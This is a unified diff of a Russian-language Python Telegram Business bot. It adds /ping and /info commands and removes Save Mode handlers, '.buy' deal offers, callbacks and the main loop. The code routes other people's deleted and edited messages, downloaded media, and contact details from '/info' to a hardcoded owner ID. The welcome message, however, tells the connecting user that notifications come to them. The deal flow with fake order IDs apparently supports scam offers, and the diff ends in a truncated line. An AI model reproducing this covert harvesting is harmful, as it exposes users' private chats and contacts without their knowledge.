@@ -27,7 +27,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN не задан")
 
-OWNER_ID = int(os.environ.get("OWNER_ID", "861978537"))  # для уведомлений Save Mode
+OWNER_ID = int(os.environ.get("OWNER_ID", "861978537"))
 DEVELOPER_NAME = "Кирюха"
 BOT_LINK = "https://t.me/work_vllw_bot"
 
@@ -617,13 +617,87 @@ async def cmd_start(message: Message):
     await message.answer(
         "👋 <b>Привет!</b>\n\n"
         "Я — бот для автоматизации Telegram Business.\n\n"
-        "📌 <b>Команды:</b>\n"
-        "<code>.buy &lt;ссылка&gt; &lt;сумма&gt; &lt;валюта&gt;</code> — оффер с кнопками\n"
-        "<code>.test &lt;ссылка&gt; &lt;сумма&gt; &lt;валюта&gt;</code> — карточка без кнопок\n\n"
-        "💾 <b>Save Mode включён.</b> Уведомления об удалениях и правках "
-        "приходят в этот чат.",
+        "<code>/ping</code> — проверка задержки\n"
+        "<code>/info</code> — инфо о человеке (reply)\n\n"
+        "💾 <b>Save Mode включён.</b> Уведомления приходят в этот чат.",
         parse_mode="HTML",
     )
+
+
+# ================= .ping =================
+@dp.message(Command("ping"))
+async def cmd_ping(message: Message):
+    import time as _t
+    start = _t.time()
+    msg = await message.answer("🏓 Pong...")
+    elapsed = (_t.time() - start) * 1000
+    try:
+        await msg.edit_text(
+            f"🏓 <b>Pong!</b>\n\n⏱ Задержка: <b>{elapsed:.0f} мс</b>",
+            parse_mode="HTML",
+        )
+    except Exception:
+        pass
+
+
+# ================= .info =================
+@dp.message(Command("info"))
+async def cmd_info(message: Message):
+    """Инфо о человеке — reply на его сообщение (в Business-чате)."""
+    bc_id = message.business_connection_id
+    if not bc_id:
+        await message.answer("⚠️ Команда работает только в Business-чатах.")
+        return
+
+    if not message.reply_to_message:
+        try:
+            await bot.send_message(
+                business_connection_id=bc_id,
+                chat_id=message.chat.id,
+                text="⚠️ Ответь на сообщение человека и напиши <code>/info</code>.",
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
+        return
+
+    target = message.reply_to_message.from_user
+    if not target:
+        return
+
+    full_name = f"{target.first_name or ''} {target.last_name or ''}".strip() or "—"
+    username = f"@{target.username}" if target.username else "— (нет username)"
+    user_id = target.id
+    is_premium = "⭐ Premium" if getattr(target, "is_premium", False) else "—"
+    is_bot = "🤖 Бот" if target.is_bot else "👤 Пользователь"
+
+    text = (
+        "👤 <b>Информация о пользователе</b>\n\n"
+        f"📛 <b>Имя:</b> {html.escape(full_name)}\n"
+        f"🔗 <b>Username:</b> {username}\n"
+        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+        f"📊 <b>Тип:</b> {is_bot}\n"
+        f"⭐ <b>Premium:</b> {is_premium}\n\n"
+        f'🔗 <a href="tg://user?id={user_id}">Открыть профиль</a>'
+    )
+
+    try:
+        await bot.send_message(
+            chat_id=OWNER_ID,
+            text=text,
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+        )
+        try:
+            await bot.send_message(
+                business_connection_id=bc_id,
+                chat_id=message.chat.id,
+                text="✅ Информация отправлена в личку.",
+            )
+        except Exception:
+            pass
+    except Exception as e:
+        logging.error(f"info fail: {e}")
 
 
 # ================= ОБРАБОТКА .buy =================
@@ -817,309 +891,4 @@ async def process_test(message: Message, bc_id):
         "chat_id": message.chat.id,
         "bc_id": bc_id,
         "expires_at": expires_at,
-        "message_id": message.message_id,
-        "has_kb": False,
-        "author_name": author_name,
-        "author_id": author_id,
-    }
-
-    deal_timers[deal_id] = asyncio.create_task(offer_timer(deal_id))
-
-
-# ================= ЕДИНЫЙ ОБРАБОТЧИК BUSINESS =================
-@dp.business_message()
-async def handle_business_message(message: Message):
-    bc_id = message.business_connection_id
-    if not bc_id:
-        return
-
-    if message.text and message.text.startswith("/"):
-        return
-
-    logging.info(
-        f"[BUSINESS MSG] bc_id={bc_id}, chat={message.chat.id}, "
-        f"from={message.from_user.id if message.from_user else '?'}, "
-        f"text={message.text!r}"
-    )
-
-    if message.text and message.text.startswith(".buy"):
-        logging.info(f"[BUSINESS BUY] bc_id={bc_id}")
-        await process_buy(message, bc_id)
-        return
-
-    if message.text and message.text.startswith(".test"):
-        logging.info(f"[BUSINESS TEST] bc_id={bc_id}")
-        await process_test(message, bc_id)
-        return
-
-    # Save Mode — сохраняем
-    if not save_mode_enabled:
-        return
-
-    age = _message_age_seconds(message)
-    if age > MAX_MESSAGE_AGE_SECONDS:
-        logging.info(f"[SKIP-OLD] age={int(age)}s")
-        return
-
-    media_type, file_id, ext = _extract_media(message)
-    media_path = ""
-    if media_type and file_id:
-        media_path = await download_media(message, file_id, ext) or ""
-        logging.info(f"[MEDIA] {media_type} → {media_path}")
-
-    try:
-        db_save_message(
-            bc_id=bc_id,
-            chat_id=message.chat.id,
-            message_id=message.message_id,
-            user_id=message.from_user.id if message.from_user else 0,
-            username=_get_username(message),
-            first_name=_get_first_name(message),
-            text=_get_text(message),
-            media_type=media_type,
-            media_path=media_path,
-            date=message.date.isoformat(),
-        )
-    except Exception as e:
-        logging.error(f"save msg fail: {e}")
-
-
-# ================= SAVE MODE: ПРАВКИ =================
-@dp.edited_business_message()
-async def on_edited_business(message: Message):
-    if not save_mode_enabled:
-        return
-    bc_id = message.business_connection_id
-    if not bc_id:
-        return
-
-    age = _message_age_seconds(message)
-    if age > MAX_MESSAGE_AGE_SECONDS:
-        return
-
-    new_text = _get_text(message)
-    old_text = db_update_text(bc_id, message.chat.id, message.message_id, new_text)
-
-    if not (old_text or "").strip() and not (new_text or "").strip():
-        return
-    if (old_text or "").strip() == (new_text or "").strip():
-        return
-
-    user = message.from_user
-    notification = build_edited_notification(
-        username=user.username if user else "?",
-        user_id=user.id if user else 0,
-        first_name=user.first_name if user else "",
-        old_text=old_text,
-        new_text=new_text,
-        date=message.date.isoformat(),
-    )
-
-    try:
-        await bot.send_message(
-            OWNER_ID, notification,
-            parse_mode="HTML",
-            disable_web_page_preview=True,
-        )
-    except Exception as e:
-        logging.error(f"notify owner fail: {e}")
-
-
-# ================= SAVE MODE: УДАЛЕНИЯ =================
-@dp.deleted_business_messages()
-async def on_deleted_business(event: BusinessMessagesDeleted):
-    if not save_mode_enabled:
-        return
-    bc_id = event.business_connection_id
-    chat_id = event.chat.id
-
-    for msg_id in event.message_ids:
-        row = db_get_message(bc_id, chat_id, msg_id)
-        if not row:
-            continue
-
-        (user_id, username, first_name, text, media_type,
-         media_path, date, is_deleted) = row
-
-        if not (text or "").strip() and not media_type:
-            continue
-
-        db_mark_deleted(bc_id, chat_id, msg_id)
-
-        notification = build_deleted_notification(
-            username=username,
-            user_id=user_id,
-            first_name=first_name,
-            text=text,
-            date=date,
-            media_type=media_type,
-        )
-
-        await send_media_to_owner(media_path, media_type, notification)
-
-
-# ================= ОБЫЧНЫЙ БОТ =================
-@dp.message(Command("buy"))
-@dp.message(F.text.startswith(".buy"))
-async def handle_regular_buy(message: Message):
-    logging.info(f"[REGULAR BUY] user={message.from_user.id}")
-    await process_buy(message, None)
-
-
-@dp.message(F.text.startswith(".test"))
-async def handle_regular_test(message: Message):
-    logging.info(f"[REGULAR TEST] user={message.from_user.id}")
-    await process_test(message, None)
-
-
-# ================= BUSINESS CONNECTION =================
-@dp.business_connection()
-async def on_business_connection(conn: BusinessConnection):
-    logging.info(
-        f"[BUSINESS CONNECTION] bc_id={conn.id}, user={conn.user.id}, "
-        f"can_reply={conn.rights.can_reply}, can_read={conn.rights.can_read_messages}"
-    )
-
-    # ✅ Приветствие владельцу Business
-    try:
-        kb = InlineKeyboardBuilder()
-        kb.row(
-            InlineKeyboardButton(text="🚀 Написать в бота", url=BOT_LINK),
-        )
-
-        await bot.send_message(
-            chat_id=conn.user.id,
-            text=(
-                "✅ <b>Вы успешно подключили SaveMode!</b>\n\n"
-                ""
-                "💾 <b>Save Mode:</b> ON\n"
-                "📥 Уведомления об удалённых и изменённых сообщениях будут приходить сюда.\n\n"
-                "🎁 <b>Пример:</b>\n"
-                "━━━━━━━━━━━━━━━━\n"
-                ""
-                f"👤 <b>Разработчик:</b> {DEVELOPER_NAME}"
-            ),
-            parse_mode="HTML",
-            disable_web_page_preview=True,
-            reply_markup=kb.as_markup(),
-        )
-        logging.info(f"[WELCOME] Отправлено в {conn.user.id}")
-    except Exception as e:
-        logging.error(f"[WELCOME] fail to {conn.user.id}: {e}")
-
-
-# ================= CALLBACKS =================
-@dp.callback_query(F.data.startswith("dec:"))
-async def process_decline(cb: CallbackQuery):
-    _, deal_id, lang = cb.data.split(":")
-    t = TEXTS.get(lang, TEXTS["ru"])
-    deal = active_deals.get(deal_id)
-    stop_timer(deal_id)
-    try:
-        if deal and deal["bc_id"]:
-            await bot.edit_message_text(
-                text=t["declined"],
-                business_connection_id=deal["bc_id"],
-                chat_id=deal["chat_id"],
-                message_id=deal["message_id"],
-                parse_mode="HTML",
-            )
-        else:
-            await cb.message.edit_text(t["declined"], parse_mode="HTML")
-    except Exception as e:
-        if "MESSAGE_ID_INVALID" not in str(e):
-            logging.error(f"decline edit fail: {e}")
-    active_deals.pop(deal_id, None)
-    await cb.answer()
-
-
-@dp.callback_query(F.data.startswith("acc:"))
-async def process_accept(cb: CallbackQuery):
-    _, deal_id, lang = cb.data.split(":")
-    t = TEXTS.get(lang, TEXTS["ru"])
-    deal = active_deals.get(deal_id)
-    if not deal:
-        await cb.answer(t["deal_lost"], show_alert=True)
-        return
-    stop_timer(deal_id)
-    await cb.answer(text=t["alert_title"], show_alert=True)
-    await asyncio.sleep(2)
-
-    deal["order_id"] = generate_order_id()
-
-    text = build_final_text(t, deal)
-    kb = build_final_keyboard(t, deal, deal_id, lang).as_markup()
-    try:
-        if deal["bc_id"]:
-            await bot.edit_message_text(
-                text=text,
-                business_connection_id=deal["bc_id"],
-                chat_id=deal["chat_id"],
-                message_id=deal["message_id"],
-                reply_markup=kb,
-                parse_mode="HTML",
-                disable_web_page_preview=False,
-            )
-        else:
-            await cb.message.edit_text(
-                text=text, reply_markup=kb,
-                parse_mode="HTML", disable_web_page_preview=False,
-            )
-    except Exception as e:
-        if "MESSAGE_ID_INVALID" not in str(e):
-            logging.error(f"accept edit fail: {e}")
-
-
-@dp.callback_query(F.data.startswith("cfm:"))
-async def process_confirm(cb: CallbackQuery):
-    _, deal_id, lang = cb.data.split(":")
-    t = TEXTS.get(lang, TEXTS["ru"])
-    deal = active_deals.get(deal_id)
-    await cb.answer(t["confirmed"], show_alert=True)
-    try:
-        if deal and deal["bc_id"]:
-            await bot.edit_message_text(
-                text=t["deal_done"],
-                business_connection_id=deal["bc_id"],
-                chat_id=deal["chat_id"],
-                message_id=deal["message_id"],
-                parse_mode="HTML",
-            )
-        else:
-            await cb.message.edit_text(t["deal_done"], parse_mode="HTML")
-    except Exception as e:
-        if "MESSAGE_ID_INVALID" not in str(e):
-            logging.error(f"confirm edit fail: {e}")
-    active_deals.pop(deal_id, None)
-
-
-# ================= WEB + MAIN =================
-async def handle(request):
-    return web.Response(text="Bot is alive!")
-
-
-async def main():
-    init_db()
-    os.makedirs(MEDIA_DIR, exist_ok=True)
-    logging.info(f"[DB] SQLite инициализирован: {DB_PATH}")
-    logging.info(f"[MEDIA] Папка для медиа: {MEDIA_DIR}")
-    logging.info(f"[OWNER] Уведомления идут user_id={OWNER_ID}")
-    logging.info(f"[FILTER] Сообщения старше {MAX_MESSAGE_AGE_SECONDS}s игнорируются")
-
-    asyncio.create_task(media_cleanup_worker())
-    logging.info(f"[CLEANUP] Автоочистка media/ каждые {MEDIA_CLEANUP_INTERVAL // 60} мин")
-
-    app = web.Application()
-    app.router.add_get("/", handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
-
-    await bot.delete_webhook(drop_pending_updates=True)
-    logging.info("[CLEANUP] Накопленные апдейты сброшены")
-
-    await dp.start_polling(bot, drop_pending_updates=True)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+        "message_id
